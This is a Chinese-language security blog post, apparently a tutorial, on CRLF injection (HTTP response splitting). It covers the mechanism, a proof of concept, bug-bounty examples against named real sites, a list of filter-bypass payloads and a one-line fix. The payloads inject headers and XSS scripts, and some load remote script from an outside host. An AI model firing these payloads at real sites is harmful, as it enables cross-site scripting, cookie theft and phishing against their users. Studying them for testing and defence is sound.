{"title":"CRLF攻击原理介绍和使用","slug":"网安大类/OWASPTOP/WebFrontEnd/CRLF攻击原理介绍和利用","date":"2019-07-17T10:36:30.000Z","updated":"2023-01-31T02:29:10.675Z","url":"2019/7-17-389.html","path":"api/articles/2019/7-17-389.html.json","covers":["https://img.weiyigeek.top/2019/1/20190921235705.png"],"content":"<p><b style=\"color:red\">注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。</b></p>\n<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言介绍\"><a href=\"#0x00-前言介绍\" class=\"headerlink\" title=\"0x00 前言介绍\"></a>0x00 前言介绍</h4><p>描述:我们知道HTTP报文的结构：状态行和首部中的每行以CRLF结束，首部与主体之间由一空行分隔。或者理解为首部最后一个字段有两个CRLF<code>首部和主体由两个CRLF分隔</code>。</p>\n<p>CRLF(Carriage-Return Line-Feed-回车换行)注入漏洞 是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。</p>\n<ul>\n<li>攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞（HTTP Response Splitting）。</li>\n<li>CRLF的概念源自打字机，表明行的结束，计算机出现后沿用了这个概念。</li>\n<li>回车(CR, ASCII 13, \\r) 换行(LF, ASCII 10, \\n)，CRLF字符（%0d%0a）CRLF也被称为HTML拆分。</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>代码</th>\n<th>ASCII码</th>\n<th>符号</th>\n<th>概念</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>CR</td>\n<td>13</td>\n<td>\\r</td>\n<td>光标移到行首</td>\n</tr>\n<tr>\n<td>LF</td>\n<td>10</td>\n<td>\\n</td>\n<td>光标垂直移到下行</td>\n</tr>\n<tr>\n<td>CRLF</td>\n<td></td>\n<td>%0d%0a</td>\n</tr>\n</tbody>\n</table>\n<p>注意:但是不同的操作系统行的结束符是不一样的,所以同一文件在不同操作系统中打开，内容格式可能会出现差异，这是行结束符不一致导致的。</p>\n<ul>\n<li>Windows：使用CRLF表示行的结束</li>\n<li>Linux/Unix：使用LF表示行的结束</li>\n<li>MacOS：早期使用CR表示，现在好像也用LF表示行的结束</li>\n</ul>\n<p>在HTTP规范中，行应该使用CRLF来结束。首部与主体由两个CRLF分隔，浏览器根据这两个CRLF来获取HTTP内容并显示。</p>\n<hr>\n\n<h4 id=\"0x01-CRLF漏洞原理\"><a href=\"#0x01-CRLF漏洞原理\" class=\"headerlink\" title=\"0x01 CRLF漏洞原理\"></a>0x01 CRLF漏洞原理</h4><p>描述：CRLF注入漏洞的本质和XSS有点相似，攻击者将恶意数据发送给易受攻击的Web应用程序，Web应用程序将恶意数据输出在HTTP响应头中。（XSS一般输出在主体中）<br>所以CRLF注入漏洞的检测也和XSS漏洞的检测差不多。通过修改HTTP参数或URL，注入恶意的CRLF，查看构造的恶意数据是否在响应头中输出。</p>\n<p><em>原理1：找到输入点，构造恶意的CRLF字符</em><br>描述:header可控的请求我们就可以尝试进行CRLF注入作为演示<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#现在HTTP标头中的每一行都由CRLF分隔（如前所述，这是不可打印的ASCII字符）。</span></span><br><span class=\"line\"><span class=\"comment\">#Request [CRLF]</span></span><br><span class=\"line\">GET /<span class=\"built_in\">test</span>/demo.php?url=https://weiyigeek.github.io [CRLF]</span><br><span class=\"line\">Host: 127.0.0.1 [CRLF]</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 [CRLF]</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 [CRLF]</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  [CRLF]</span><br><span class=\"line\">Accept-Encoding: gzip, deflate [CRLF]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Response</span></span><br><span class=\"line\">HTTP/1.1 200 OK [CRLF]</span><br><span class=\"line\">Connection: keep-alive [CRLF]</span><br><span class=\"line\">Content-Encoding: deflate [CRLF]</span><br><span class=\"line\">Locations=https://weiyigeek.github.io [CRLF]</span><br></pre></td></tr></table></figure></p>\n<p>抓包在请求行的url参数中加入特殊构造的CRLF字符,查看恶意数据是否在响应头中多了个Set-Cookie字段，如果证实了该系统存在CRLF注入漏洞就可以进行下一步；<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190921235705.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>构造POC:<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2047%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<p>请求上面的POC后的响应头,触发我们的js并弹窗这也就是最简单的一次crlf注入<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#Content-Length：0 代表header 的结尾返回包会变成这个样子</span></span><br><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Content-Encoding: deflate</span><br><span class=\"line\">Locations=https://baidu.com</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"0x02-CRLF漏洞利用\"><a href=\"#0x02-CRLF漏洞利用\" class=\"headerlink\" title=\"0x02 CRLF漏洞利用\"></a>0x02 CRLF漏洞利用</h4><p>描述:我们在渗透测试过程中可以寻找我们可控返回包header的请求;</p>\n<p><em>示例1.区块链中的CRLF注入</em><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#当我浏览网站时，发现了一个可以下载JSON和CSV格式的图表数据的地方。</span></span><br><span class=\"line\">GET /charts/total-bitcoins?cors=<span class=\"literal\">true</span>&amp;format=csv&amp;lang=english HTTP/1.1</span><br><span class=\"line\">Host: api.blockchain.info</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#注意最后的lang请求参数并将其更改为“ lang = english”,这时候响应标头有所不同</span></span><br><span class=\"line\">HTTP/2.0 200 OK</span><br><span class=\"line\">date: Tue, 31 Oct 2017 15:47:21 GMT</span><br><span class=\"line\">content-type: text/csv; charset=ascii</span><br><span class=\"line\">content-length: 10953</span><br><span class=\"line\">access-control-allow-origin: *</span><br><span class=\"line\">cache-control: public, max-age=60</span><br><span class=\"line\">content-disposition: attachment; filename=<span class=\"string\">\"total-bitcoins.csv\"</span></span><br><span class=\"line\">content-language: english</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#验证检查是否可以添加“ CRLF”并添加自己的响应头，以检查是否插入了“ CRLF”(必须对其进行URL编码),发送请求时\\ r \\ n的URL编码为“%0D%0A”</span></span><br><span class=\"line\">https://api2.blockchain.info/charts/total-bitcoins?cors=<span class=\"literal\">true</span>&amp;format=csv&amp;lang=en%0ATEST    <span class=\"comment\">#在返回包里面发现响应头TEST</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#利用CRLF漏洞去执行JavaScript代码，去盗取cookie或构筑钓鱼页面</span></span><br><span class=\"line\">https://api2.blockchain.info/charts/total-bitcoins?cors=<span class=\"literal\">true</span>&amp;format=csv&amp;lang=en%0AX-XSS-Protection:0%0AContent-Type:text/html%0AContent-Length:35%0A%0A% 3Csvg%20onload%3Dalert%28document.domain%29%3E＆__ cf_waf_tk __ = 012853002E6loVIOSyqHfdxrvHJ87MshEnZI</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p><em>示例2: 路径作为HEADER返回包的响应头;</em><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#其实利用方法与上面的大致一致,不同的是出现的缺陷的位置值得注意</span></span><br><span class=\"line\">http://test.com/demo/HEADER  <span class=\"comment\">#HEADER会出现在header中</span></span><br><span class=\"line\"></span><br><span class=\"line\">HTTP/2.0 200 OK</span><br><span class=\"line\">date: Tue, 31 Oct 2017 15:47:21 GMT</span><br><span class=\"line\">Localtion: HEADER</span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<p><em>示例3:值得学习的利用跳转XSS</em><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#请求</span></span><br><span class=\"line\">https://team.badoo.com/%0d%0adata:text/html;text,%3Csvg%2fonload%3Dprompt%281%29%3E</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#返回的头</span></span><br><span class=\"line\">Location: data:text/html;text,%3Csvg%2fonload%3Dprompt%281%29%3E</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"0x03-CRLF绕过\"><a href=\"#0x03-CRLF绕过\" class=\"headerlink\" title=\"0x03 CRLF绕过\"></a>0x03 CRLF绕过</h4><p><strong>补充附录：</strong></p>\n<ul>\n<li>挖掘CRLF漏洞和bypass安全检测Payload<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%0d%0a</span><br><span class=\"line\">%0d%0a%0d%0a</span><br><span class=\"line\">r%0d%0aContentLength:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContentType:%20text/html%0d%0aContentLength:%2019%0d%0a%0d%0a&lt;html&gt;Injected%02Content&lt;/html&gt;</span><br><span class=\"line\">%0d%0d%0a%0a</span><br><span class=\"line\">0x0D0x0A</span><br><span class=\"line\">0x0D0x0D0x0A0x0A</span><br><span class=\"line\">\\r\\n</span><br><span class=\"line\">%5cr%5cn</span><br><span class=\"line\">%0%0d%0ad%0%0d%0aa</span><br><span class=\"line\">%0%0D%0AD%0%0D%0AA</span><br><span class=\"line\">%0d%0aContentType:%20text/html;charset=UTF-7%0d%0aContent-Length:%20129%0d%0a%0d%0a%2BADw-html%2BAD4-%2BADw-body%2BAD4-%2BADw-script%2BAD4-alert%28%27XSS,cookies:%27%2Bdocument.cookie%29%2BADw-/script%2BAD4-%2BADw-/body%2BAD4-%2BADw-/html%2BAD4</span><br><span class=\"line\">%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span><br><span class=\"line\">%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span><br><span class=\"line\">%0AContent-Type:html%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3Ehttp://www.test.com</span><br><span class=\"line\">%0d%0a%0d%0a%3Chtml%3E%3Cbody%3E%3C%2Fbody%3E%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fs.js%3E%3C%2Fscript%3E%3Cscript%3Ealert(%22location.host%20is:%20%22%2Blocation.host)%3C%2Fscript%3E%3C%2Fhtml%3E</span><br><span class=\"line\">%0d%0a%0d%0a%3Cscript+src%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2Fscript%3E</span><br><span class=\"line\">%22%3E%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E%3C%22</span><br><span class=\"line\">%0AContent-type:%20text/html%0A%0Ahttp://www.test.com/%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span><br><span class=\"line\">%0d%0a%0d%0a%3Cscript%3Ealert(%22XSS%22)%3C%2Fscript%3E</span><br><span class=\"line\">%0A%0A%3Cscript%3Ealert(%22XSS%22)%3C/script%3E</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<hr>\n\n<h4 id=\"0x04-安全防御\"><a href=\"#0x04-安全防御\" class=\"headerlink\" title=\"0x04 安全防御\"></a>0x04 安全防御</h4><p>漏洞修复关键点:<br>过滤 \\r 、\\n 之类的行结束符，避免输入的数据污染其他 HTTP 首部字段。</p>\n<hr>\n\n<h4 id=\"0x05-参考来源\"><a href=\"#0x05-参考来源\" class=\"headerlink\" title=\"0x05 参考来源\"></a>0x05 参考来源</h4><ul>\n<li>示例1: <a href=\"http://blog.shashank.co/2017/11/crlf-injection-in-bockchaininfo.html\" target=\"_blank\" rel=\"noopener\">http://blog.shashank.co/2017/11/crlf-injection-in-bockchaininfo.html</a></li>\n<li>示例2: <a href=\"https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62\" target=\"_blank\" rel=\"noopener\">https://medium.com/bugbountywriteup/bugbounty-exploiting-crlf-injection-can-lands-into-a-nice-bounty-159525a9cb62</a></li>\n</ul>\n","comments":true,"excerpt":"注意：本文分享给安全从业人员、网站开发人员以及运维人员在日常工作防范恶意攻击,请勿恶意使用下面介绍技术进行非法攻击操作。。[TOC]","categories":[{"name":"前端漏洞","path":"api/categories/前端漏洞.json"}],"tags":[{"name":"CRLF","path":"api/tags/CRLF.json"}]}